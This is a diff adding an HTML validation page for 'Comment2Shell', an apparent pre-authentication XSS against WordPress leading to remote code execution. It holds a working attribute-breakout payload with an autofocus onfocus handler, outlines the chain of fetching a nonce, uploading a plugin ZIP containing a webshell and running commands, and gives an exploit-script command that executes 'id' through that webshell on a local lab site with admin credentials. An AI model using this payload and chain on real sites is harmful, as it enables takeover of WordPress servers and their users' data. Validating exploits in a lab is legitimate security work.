@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Comment2Shell XSS Validation</title>
+<style>
+  body { font-family: 'Courier New', monospace; padding: 40px; background: #0d1117; color: #c9d1d9; }
+  h1 { color: #58a6ff; }
+  #status { font-size: 24px; padding: 25px; margin: 20px 0; border: 3px solid #30363d; background: #161b22; }
+  .fired { border-color: #3fb950 !important; background: #0d2818 !important; color: #3fb950; }
+  .payload-box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin: 15px 0; overflow-x: auto; font-size: 12px; }
+  .info { color: #8b949e; }
+  .test { border: 2px solid #30363d; padding: 20px; margin: 20px 0; }
+  button { background: #238636; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; }
+</style>
+</head>
+<body>
+
+<h1>Comment2Shell XSS Browser Validation</h1>
+<p class="info">CVE-2026-93485 - WordPress Pre-Auth XSS</p>
+
+<div id="status">Waiting for XSS trigger...</div>
+
+<h2>Test 1: Detection Payload (should change title)</h2>
+<div class="test">
+<p>Auto-focusing element below (autofocus):</p>
+<blockquote cite="a
+b"><code x" onfocus='document.title="C2S_XSS_FIRED";document.getElementById("status").className="fired";document.getElementById("status").innerHTML="XSS TRIGGERED - document.title = "+document.title;' autofocus tabindex=0>Focus me (XSS test)</code></blockquote>
+</div>
+
+<h2>Test 2: Manual trigger button</h2>
+<div class="test">
+<p>If autofocus didn't work, click the element above or press Tab to focus it.</p>
+<button onclick="document.title='C2S_XSS_MANUAL';document.getElementById('status').className='fired';document.getElementById('status').innerHTML='Manual trigger worked - now test autofocus above';">Manual Test</button>
+</div>
+
+<h2>Test 3: What to check in Console (F12)</h2>
+<div class="test">
+<p>Open DevTools Console and run:</p>
+<pre class="payload-box">document.title  // Should show C2S_XSS_FIRED if XSS worked
+document.activeElement  // Should show the focused element</pre>
+</div>
+
+<h2>Live Site Payload (from http://127.0.0.1/?p=1)</h2>
+<p class="info">Visit the actual post while logged in as admin:</p>
+<div class="payload-box">
+URL: http://127.0.0.1/?p=1<br>
+Login: admin / Password123!<br><br>
+Expected behavior:<br>
+1. Page loads<br>
+2. Code element auto-focuses (autofocus)<br>
+3. onfocus fires -> sets document.title = "C2S_XSS_..."<br>
+4. For full RCE: JS fetches nonce -> builds ZIP -> uploads webshell
+</div>
+
+<h2>Check Webshell</h2>
+<div class="payload-box">
+After visiting the post as admin, check:<br>
+http://127.0.0.1/wp-content/plugins/u10b0d/u10b0d.php<br><br>
+Or run: python3 comment2shell.py --exec -t http://127.0.0.1 --shell-path u10b0d/u10b0d.php -c "id"
+</div>
+
+<script>
+const origTitle = document.title;
+console.log("%cComment2Shell XSS Validator", "color: #58a6ff; font-size: 20px;");
+console.log("Original title:", origTitle);
+console.log("Watching for title changes...");
+
+setInterval(() => {
+    if (document.title !== origTitle && document.title.includes("C2S_XSS")) {
+        console.log("%cXSS FIRED!", "color: #3fb950; font-size: 16px; font-weight: bold;");
+        console.log("New title:", document.title);
+    }
+}, 50);
+
+// Log focus events
+document.addEventListener("focusin", (e) => {
+    console.log("Focus:", e.target.tagName, e.target);
+});
+</script>
+
+</body>
+</html>
